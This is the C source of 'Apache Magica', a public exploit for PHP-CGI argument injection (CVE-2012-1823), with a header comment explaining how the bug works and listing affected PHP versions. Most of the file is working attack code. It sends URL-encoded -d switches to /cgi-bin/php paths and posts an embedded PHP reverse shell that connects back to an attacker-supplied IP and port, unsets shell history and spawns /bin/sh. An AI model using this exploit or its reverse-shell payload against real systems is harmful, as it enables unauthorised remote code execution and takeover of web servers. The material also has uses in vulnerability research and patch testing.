/* Apache Magica by Kingcope */
/* gcc apache-magika.c -o apache-magika -lssl */
/* This is a code execution bug in the combination of Apache and PHP.
On Debian and Ubuntu the vulnerability is present in the default install
of the php5-cgi package. When the php5-cgi package is installed on Debian and
Ubuntu or php-cgi is installed manually the php-cgi binary is accessible under
/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute
the binary because this binary has a security check enabled when installed with
Apache http server and this security check is circumvented by the exploit.
When accessing the php-cgi binary the security check will block the request and
will not execute the binary.
In the source code file sapi/cgi/cgi_main.c of PHP we can see that the security
check is done when the php.ini configuration setting cgi.force_redirect is set
and the php.ini configuration setting cgi.redirect_status_env is set to no.
This makes it possible to execute the binary bypassing the Security check by
setting these two php.ini settings.
Prior to this code for the Security check getopt is called and it is possible
to set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the
-d switch. If both values are set to zero and the request is sent to the server
php-cgi gets fully executed and we can use the payload in the POST data field
to execute arbitrary php and therefore we can execute programs on the system.
apache-magika.c is an exploit that does exactly the prior described. It does
support SSL.
/* Affected and tested versions
PHP 5.3.10
PHP 5.3.8-1
PHP 5.3.6-13
PHP 5.3.3
PHP 5.2.17
PHP 5.2.11
PHP 5.2.6-3
PHP 5.2.6+lenny16 with Suhosin-Patch
Affected versions
PHP prior to 5.3.12
PHP prior to 5.4.2
Unaffected versions
PHP 4 - getopt parser unexploitable
PHP 5.3.12 and up
PHP 5.4.2 and up
Unaffected versions are patched by CVE-2012-1823.
*/
/*    .
     /'\rrq rk
 .  // \\  .
.x.//fco\\-|-
 '//cmtco\\zt
 //6meqrg.\\tq
//_________\\'
EJPGQO
apache-magica.c by Kingcope
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <stddef.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>

typedef struct {
	int sockfd;
	SSL *handle;
	SSL_CTX *ctx;
} connection;

void usage(char *argv[])
{
  printf("usage: %s <--target target> <--port port> <--protocol http|https> " \
  "<--reverse-ip ip> <--reverse-port port> [--force-interpreter interpreter]\n",
   argv[0]);
  exit(1);
}

char poststr[] = "POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F" \
 "%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64" \
 "+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73" \
 "%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E" \
 "%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63" \
 "%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62" \
 "%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74" \
 "%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68" \
 "%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F" \
 "%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63" \
 "%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73" \
 "%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n" \
 "Host: %s\r\n" \
 "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26" \
 "(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n" \
 "Content-Type: application/x-www-form-urlencoded\r\n" \
 "Content-Length: %d\r\n" \
 "Connection: close\r\n\r\n%s";
char phpstr[] = "<?php\n" \
"set_time_limit(0);\n" \
"$ip = '%s';\n" \
"$port = %d;\n" \
"$chunk_size = 1400;\n" \
"$write_a = null;\n" \
"$error_a = null;\n" \
"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\n" \
"$daemon = 0;\n" \
"$debug = 0;\n" \
"if (function_exists('pcntl_fork')) {\n" \
"	$pid = pcntl_fork();	\n" \
"	if ($pid == -1) {\n" \
"		printit(\"ERROR: Can't fork\");\n" \
"		exit(1);\n" \
"	}\n" \
"	if ($pid) {\n" \
"		exit(0);\n" \
"	}\n" \
"	if (posix_setsid() == -1) {\n" \
"		printit(\"Error: Can't setsid()\");\n" \
"		exit(1);\n" \
"	}\n" \
"	$daemon = 1;\n" \
"} else {\n" \
"	printit(\"WARNING: Failed to daemonise.\");\n" \
"}\n" \
"chdir(\"/\");\n" \
"umask(0);\n" \
"$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n" \
"if (!$sock) {\n" \
"	printit(\"$errstr ($errno)\");\n" \
"	exit(1);\n" \
"}\n" \
"$descriptorspec = array(\n" \
"   0 => array(\"pipe\", \"r\"),\n" \
"   1 => array(\"pipe\", \"w\"),\n" \
"   2 => array(\"pipe\", \"w\")\n" \
");\n" \
"$process = proc_open($shell, $descriptorspec, $pipes);\n" \
"if (!is_resource($process)) {\n" \
"	printit(\"ERROR: Can't spawn shell\");\n" \
"	exit(1);\n" \
"}\n" \
"stream_set_blocking($pipes[0], 0);\n" \
"stream_set_blocking($pipes[1], 0);\n" \
"stream_set_blocking($pipes[2], 0);\n" \
"stream_set_blocking($sock, 0);\n" \
"while (1) {\n" \
"	if (feof($sock)) {\n" \
"		printit(\"ERROR: Shell connection terminated\");\n" \
"		break;\n" \
"	}\n" \
"	if (feof($pipes[1])) {\n" \
"		printit(\"ERROR: Shell process terminated\");\n" \
"		break;\n" \
"	}\n" \
"	$read_a = array($sock, $pipes[1], $pipes[2]);\n" \
"	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n" \
"	if (in_array($sock, $read_a)) {\n" \
"		if ($debug) printit(\"SOCK READ\");\n" \
"		$input = fread($sock, $chunk_size);\n" \
"		if ($debug) printit(\"SOCK: $input\");\n" \
"		fwrite($pipes[0], $input);\n" \
"	}\n" \
"	if (in_array($pipes[1], $read_a)) {\n" \
"		if ($debug) printit(\"STDOUT READ\");\n" \
"		$input = fread($pipes[1], $chunk_size);\n" \
"		if ($debug) printit(\"STDOUT: $input\");\n" \
"		fwrite($sock, $input);\n" \
"	}\n" \
"	if (in_array($pipes[2], $read_a)) {\n" \
"		if ($debug) printit(\"STDERR READ\");\n" \
"		$input = fread($pipes[2], $chunk_size);\n" \
"		if ($debug) printit(\"STDERR: $input\");\n" \
"		fwrite($sock, $input);\n" \
"	}\n" \
"}\n" \
"\n" \
"fclose($sock);\n" \
"fclose($pipes[0]);\n" \
"fclose($pipes[1]);\n" \
"fclose($pipes[2]);\n" \
"proc_close($process);\n" \
"function printit ($string) {\n" \
"	if (!$daemon) {\n" \
"		print \"$string\n\";\n" \
"	}\n" \
"}\n" \
"exit(1);\n" \
"?>";

struct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)
{
 struct hostent *he;
 struct sockaddr_in server, *servercopy;
 
 if ((he=gethostbyname(hostname)) == NULL) {
  printf("Hostname cannot be resolved\n");
  exit(255);
 }
 
 servercopy = malloc(sizeof(struct sockaddr_in));
 if (!servercopy) {
	printf("malloc error (1)\n");
	exit(255);
 }
 memset(&server, '\0', sizeof(struct sockaddr_in));
 memcpy(&server.sin_addr, he->h_addr_list[0],  he->h_length);
 server.sin_family = AF_INET;
 server.sin_port = htons(port);
 memcpy(servercopy, &server, sizeof(struct sockaddr_in));
 return servercopy;
}

char *sslread(connection *c)
{
  char *rc = NULL;
  int received, count = 0, count2=0;
  char ch;

  for(;;)
  {
   if (!rc)
    rc = calloc(1024, sizeof (char) + 1);
   else
    if (count2 % 1024 == 0) {
     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);
    }
    received = SSL_read(c->handle, &ch, 1);
    if (received == 1) {
     rc[count++] = ch;
     count2++;
     if (count2 > 1024*5)
	  break;
    }
    else
     break;
   }
  return rc;
}

char *read_(int sockfd)
{
  char *rc = NULL;
  int received, count = 0, count2=0;
  char ch;

  for(;;)
  {
   if (!rc)
    rc = calloc(1024, sizeof (char) + 1);
   else
    if (count2 % 1024 == 0) {
     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);
    }
    received = read(sockfd, &ch, 1);
    if (received == 1) {
     rc[count++] = ch;
     count2++;
     if (count2 > 1024*5)
	  break;
    }
    else
     break;
   }
  return rc;
}

void main(int argc, char *argv[])
{
  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,
   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;
  char httpsflag=0;
  unsigned short port=0, reverseport=0;
  struct sockaddr_in *server;
  int sockfd;
  unsigned int writesize, tmpsize;
  unsigned int i;
  connection *sslconnection;
  printf("-== Apache Magika by Kingcope ==-\n");
  for(;;)
  {
	 int c;
     int option_index=0;
     static struct option long_options[] = {
	   {"target", required_argument, 0, 0 },
	   {"port", required_argument, 0, 0 },
	   {"protocol", required_argument, 0, 0 },
	   {"reverse-ip", required_argument, 0, 0 },
	   {"reverse-port", required_argument, 0, 0 },
	   {"force-interpreter", required_argument, 0, 0 },	   
	   {0, 0, 0, 0 }
	  };
	 
	 c = getopt_long(argc, argv, "", long_options, &option_index);
     if (c < 0)
     	break;
     
     switch (c) {
	 case 0:
	  switch (option_index) {
	   case 0:
	    if (optarg) {
	     target = calloc(strlen(optarg)+1, sizeof(char));
	     if (!target) {
		  printf("calloc error (2)\n");
	      exit(255);
         }
	     memcpy(target, optarg, strlen(optarg)+1);
    	}
        break;
       case 1:
        if(optarg)
	     port = atoi(optarg);
        break;
       case 2:
        protocol = calloc(strlen(optarg)+1, sizeof(char));
        if (!protocol) {
	     printf("calloc error (3)\n");
         exit(255);
        }
        memcpy(protocol, optarg, strlen(optarg)+1);
        if (!strcmp(protocol, "https"))
         httpsflag=1;
        break;
       case 3:
        reverseip = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseip) {
	     printf("calloc error (4)\n");
         exit(255);
        }
        memcpy(reverseip, optarg, strlen(optarg)+1);       
        break;
       case 4:
	    reverseport = atoi(optarg);       
		reverseportstr = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseportstr) {
	     printf("calloc error (5)\n");
         exit(255);
        }
        memcpy(reverseportstr, optarg, strlen(optarg)+1);  	     
        break;
       case 5:
        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));
        if (!forceinterpreter) {
	     printf("calloc error (6)\n");
         exit(255);
        }
        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       
        break;
       default:
        usage(argv);
	  }
	  break;
	 
	 default:
	  usage(argv);
     }
  }

  if ((optind < argc) || !target || !protocol || !port ||
      !reverseip || !reverseport){
	usage(argv);
  }
  
  server = gethostbyname_(target, port);
  if (!server) {
   printf("Error while resolving hostname. (7)\n");
   exit(255);
  }

  char *interpreters[5];
  int ninterpreters = 5;
  interpreters[0] = strdup("/cgi-bin/php");
  interpreters[1] = strdup("/cgi-bin/php5");
  interpreters[2] = strdup("/cgi-bin/php-cgi");
  interpreters[3] = strdup("/cgi-bin/php.cgi");
  interpreters[4] = strdup("/cgi-bin/php4");
  
  for (i=0;i<ninterpreters;i++) {
   interpreter = interpreters[i];
   if (forceinterpreter) {
     interpreter = strdup(forceinterpreter);
   }
   if (forceinterpreter && i)
    break;
   printf("%s\n", interpreter);
   
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 1) { 
	 printf("socket error (8)\n");
	 exit(255);
   }
  
   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {
    printf("connect error (9)\n");
    exit(255);	  
   }
   if (httpsflag) {
    sslconnection = (connection*) malloc(sizeof(connection));
    if (!sslconnection) {
     printf("malloc error (10)\n");
     exit(255);   
    }
    sslconnection->handle = NULL;
    sslconnection->ctx = NULL;

    SSL_library_init();

    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());
    if (!sslconnection->ctx) {
 	 printf("SSL_CTX_new error (11)\n");
     exit(255);
    }

    sslconnection->handle = SSL_new(sslconnection->ctx);
    if (!sslconnection->handle) {
 	 printf("SSL_new error (12)\n");
	 exit(255);   
    }
    if (!SSL_set_fd(sslconnection->handle, sockfd)) {
 	 printf("SSL_set_fd error (13)\n");
     exit(255);
    }
   
    if (SSL_connect(sslconnection->handle) != 1) {
	 printf("SSL_connect error (14)\n");
     exit(255);       
    }
   }
  
   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;
   tmpstr = (char*)calloc(tmpsize, sizeof(char));
   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);
   
   writesize = strlen(target) + strlen(interpreter) + 
     strlen(poststr) + strlen(tmpstr) + 64;
   writestr = (char*)calloc(writesize, sizeof(char));
   snprintf(writestr, writesize, poststr, interpreter,
     target, strlen(tmpstr), tmpstr);
  
   if (!httpsflag) {
	 write(sockfd, writestr, strlen(writestr));
	 readbuf = read_(sockfd);
   } else {
	 SSL_write(sslconnection->handle, writestr, strlen(writestr));
	 readbuf = sslread(sslconnection);
   }
  
   if (readbuf) {
     printf("***SERVER RESPONSE***\n\n%s\n\n", readbuf);  
   } else {
    printf("read error (15)\n");
    exit(255);	  
   }
  }
  exit(1);
}